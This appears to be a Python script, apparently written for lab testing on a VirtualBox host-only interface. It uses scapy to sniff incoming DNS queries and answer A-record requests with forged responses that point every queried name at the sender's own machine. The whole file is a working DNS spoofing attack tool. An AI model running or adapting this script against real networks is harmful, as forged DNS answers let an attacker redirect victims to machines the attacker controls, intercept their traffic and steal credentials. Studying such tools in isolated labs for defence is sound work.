from scapy.all import *
from dataclasses import dataclass

"""For testing, these need to come from the main tool / arguments eventually"""
#INTERFACE: str = 'enp10s0u1u3u3'
INTERFACE: str = 'vboxnet0'
NEW_DNS: str = get_if_addr(INTERFACE)


def recordTypeIdToName(id: int) -> str:
    """
    Convert type ID to name for readability
    For now, only common onces are included
    https://en.wikipedia.org/wiki/List_of_DNS_record_types
    """
    typeMap = {
        1: 'A',
        28: 'AAAA',
        5: 'CNAME',
        39: 'DNAME',
        15: 'MX',
        33: 'SRV',
        16: 'TXT'
    }

    if id in typeMap:
        return typeMap[id]
    else:
        return str(id)

def isIncoming(pkt: Packet) -> bool:
    """Filter to check, whether a packet is (supposedly) incoming, and not from this interface"""
    return pkt[Ether].src != get_if_hwaddr(INTERFACE)

def get_spoof_packet(req_pkt: Packet, name: str, recordType: str) -> Packet:
    """Generate one spoofed DNS response packet in response to a particular request"""
    res_pkt: Packet = (
        IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src) /
        UDP(sport=req_pkt[IP].dport, dport=req_pkt[IP].sport)
    )

    if recordType == 1:
        # type: A
        res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=NEW_DNS))
    else:
        print(f'Type {recordTypeIdToName(recordType)} not supported, generating empty packet...')

    return res_pkt


def spoof_dns(pkt: Packet) -> None:
    """For a sniffed DNS packet, generate and send spoofed DNS responses for each requested record"""
    if pkt and DNS in pkt:
        for i in range(int(pkt[DNS].qdcount)):
            # qdcount = the number of requested records
            name = pkt[DNS].qd[i].qname
            recordType = pkt[DNS].qd[i].qtype
            print(f'Received DNS request from {pkt[IP].src} for {name} of type {recordTypeIdToName(recordType)}')

            res_pkt = get_spoof_packet(pkt, name, recordType)
            send(res_pkt, iface=INTERFACE)


if __name__ == '__main__':
    try:
        while True:
            pkt = sniff(iface=INTERFACE, prn=spoof_dns, lfilter=isIncoming, timeout=1)
            # Sleeping to allow for keyboard interrupt during testing. Looking into better way to do this...
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nExit...")
